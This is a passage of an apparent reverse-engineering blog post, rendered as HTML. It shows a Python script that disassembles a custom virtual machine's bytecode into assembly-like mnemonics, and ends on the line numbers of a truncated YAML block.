class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> 30c0&#x27;</span>)<br>        cmp_flag = <span class="hljs-number">1</span><br>        rip += <span class="hljs-number">2</span><br><br>    <span class="hljs-comment"># 存取值</span><br>    <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">6</span>:<br>        <span class="hljs-comment"># 立即数</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            v14 = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># 寄存器</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 4]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">4</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># 取值</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">2</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 4]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tAlmost[vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>]&#x27;</span>)<br>            rip += <span class="hljs-number">4</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># 存值</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">32</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 4]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mov Almost[vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>]\tvm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">4</span><br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 逻辑运算</span><br>    <span class="hljs-keyword">if</span> cc_flag == <span class="hljs-number">1</span>:<br>        v14 = <span class="hljs-number">0</span><br>        cc_flag = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># 立即数运算</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">1</span>:<br>            v14 = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> add vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> sub vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mul vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> div vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">4</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mod vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">5</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> or vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">6</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> and vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">7</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> xor vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">8</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shl vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">9</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shr vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\t<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">7</span><br>                <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment"># 寄存器运算</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>            v14 = opcode[rip + <span class="hljs-number">3</span>]<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 4]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> add vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> sub vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mul vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">3</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> div vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">4</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> mod vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">5</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> or vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">6</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> and vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">7</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> xor vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">8</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shl vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">9</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> shr vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">2</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;v14&#125;</span>&#x27;</span>)<br>                rip += <span class="hljs-number">4</span><br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 比较</span><br>    <span class="hljs-keyword">if</span> cmp_flag == <span class="hljs-number">1</span>:<br>        cmp_flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">1</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 8]]), end=&#x27; &#x27;)</span><br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">7</span>], opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> cmp vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>\t<span class="hljs-subst">&#123;num&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">8</span><br>            <span class="hljs-comment"># print(f&#x27;debug:&#123;opcode[rip:rip+8]&#125;&#x27;)</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 5]]), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> cmp vm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">3</span>]&#125;</span>\tvm_regs_<span class="hljs-subst">&#123;opcode[rip + <span class="hljs-number">4</span>]&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">5</span><br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># 跳转</span><br>    <span class="hljs-keyword">if</span> opcode[rip] == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            addr = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                               base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jmp <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(addr + rip)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">1</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jeq <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">2</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">3</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">4</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jeg <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">5</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jl <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> opcode[rip + <span class="hljs-number">2</span>] == <span class="hljs-number">6</span>:<br>            num = c_int32(<span class="hljs-built_in">int</span>(pack(<span class="hljs-string">&#x27;&lt;BBBB&#x27;</span>, opcode[rip + <span class="hljs-number">6</span>], opcode[rip + <span class="hljs-number">5</span>], opcode[rip + <span class="hljs-number">4</span>], opcode[rip + <span class="hljs-number">3</span>]).<span class="hljs-built_in">hex</span>(),<br>                              base=<span class="hljs-number">16</span>)).value<br>            <span class="hljs-comment"># print(&#x27;&#x27;.join([hex(k)[2:].zfill(2) for k in opcode[rip:rip + 7]]).rjust(16), end=&#x27; &#x27;)</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)&#125;</span> jle <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip + num)&#125;</span>&#x27;</span>)<br>            rip += <span class="hljs-number">7</span><br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span 